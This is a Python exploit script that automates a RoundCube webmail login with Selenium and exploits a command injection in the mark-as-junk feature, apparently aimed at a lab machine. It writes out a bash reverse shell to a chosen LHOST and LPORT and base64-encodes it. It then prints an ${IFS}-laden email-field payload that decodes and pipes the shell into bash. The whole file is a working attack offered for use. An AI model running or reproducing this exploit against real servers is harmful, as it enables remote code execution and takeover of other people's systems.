import os
import argparse
import sys
import time
from colorama import Fore
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import importlib.util
import base64
from subprocess import Popen

RED = Fore.RED
YELLOW = Fore.YELLOW
GREEN = Fore.GREEN
MAGENTA = Fore.MAGENTA
BLUE = Fore.BLUE
CYAN = Fore.CYAN
RESET = Fore.RESET

parser = argparse.ArgumentParser(description="Mark as Junk RoundCube",
formatter_class=argparse.ArgumentDefaultsHelpFormatter)

parser = argparse.ArgumentParser(description="Mark as Junk RoundCube", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("-p", "--PASSWORD", action="store", help="Password")
parser.add_argument("-u", "--USERNAME", action="store", help="Username")
parser.add_argument("-U", "--URL", action="store", help="URL")
parser.add_argument("-l", "--LHOST", action="store", help="LHOST")
parser.add_argument("-P", "--LPORT", action="store", help="LPORT")

args = parser.parse_args()
parser.parse_args(args=None if sys.argv[1:] else ['--help'])

PASS = args.PASSWORD
USER = args.USERNAME
URL = args.URL
LHOST = args.LHOST
LPORT = args.LPORT

options = webdriver.FirefoxOptions()
service = Service('/usr/local/bin/geckodriver')  # Define the service with the correct path
driver = webdriver.Firefox(service=service, options=options)  # Use the service parameter
URL1 = f"{URL}"
driver.get(URL1)

print(f"{MAGENTA}Trying to login with user {YELLOW}{USER}{MAGENTA} and password {YELLOW}{PASS}{RESET}")
element = driver.find_element(By.ID, 'rcmloginuser')
element.send_keys(USER)
element = driver.find_element(By.ID, 'rcmloginpwd')
element.send_keys(PASS)
element.submit()
time.sleep(4)
clickable = driver.find_element(By.ID, "rcmbtn105")
clickable.click()
clickable = driver.find_element(By.ID, "rcmbtn109")
clickable.click()
clickable = driver.find_element(By.ID, "rcmrow1")
clickable.click()
print(f"{MAGENTA}\nAttempting to make a base64 encoded bash reverse shell\n{RESET}")
s = Popen([f"echo 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' > a.txt"], shell=True)
s.wait()
s = Popen([f"base64 a.txt > b.txt"], shell=True)
s.wait()
s = Popen(["tr -d '\n' < b.txt > shell.txt"], shell=True)
s.wait()
with open ("shell.txt", "r") as f:
	content = f.read()
	a = 'admin&echo${IFS}'
	b = '${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash&@hybrid.vl'
	print(f"{MAGENTA}\nEnter the following into email field, everything that is in yellow (yes even the IFS part), then click save {YELLOW}{a}{content}{b}{RESET}\n")
answer = input(f"\n{RED}Press ENTER to continue{RESET}\n")
os.remove("a.txt")
os.remove("b.txt")
os.remove("shell.txt")
clickable = driver.find_element(By.ID, "rcmbtn101")
clickable.click()
clickable = driver.find_element(By.ID, "rcmliU2VudA")
clickable.click()
print(f"{YELLOW}Now click on a sent item and send to junk, make sure listener is ready{RESET}")
